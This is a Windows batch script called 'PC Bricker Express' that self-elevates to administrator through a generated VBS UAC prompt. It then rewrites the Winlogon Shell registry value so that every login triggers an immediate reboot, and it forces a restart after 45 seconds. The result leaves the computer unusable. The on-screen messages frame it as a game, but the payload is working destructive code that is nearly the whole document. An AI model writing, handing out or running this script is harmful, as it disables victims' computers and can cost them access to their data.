title PC Bricker Express - LD + JS
color C7
@echo off
cls

:: BatchGotAdmin
:-------------------------------------
REM  --> Check for permissions
>nul 2>&1 "net" "session" 

REM --> If error flag set, we do not have admin.
if '%errorlevel%' NEQ '0' (
	echo Welcome to PC Bricker Express.
	echo This program will make modifications to your computer so we will require elevated permissions.
	echo When the next prompt appears, press yes to initialize PC Bricker Express.
	echo.
	pause
    echo Prompting UAC...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
    goto code
:-------------------------------------- 

:code
color 0C
cls
echo Welcome to PC Bricker Express!
echo Don't ask us where PC Bricker Slow edition went...
echo Press any key on your keyboard now to brick your computer!
pause >nul

cls
echo You have one minute to find out how to reverse this!
echo After 45 seconds, your pc will shut down!
echo Press any key to confirm. You can always go back...
pause >nul

color C7
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /t REG_SZ /v Shell /d "shutdown /r /t 0" /f
echo You now have 45 seconds to fix it! Good luck!
shutdown /r /t 45
regedit
echo Thanks for using PCBricker Express! We hope to see you again soon!
pause >nul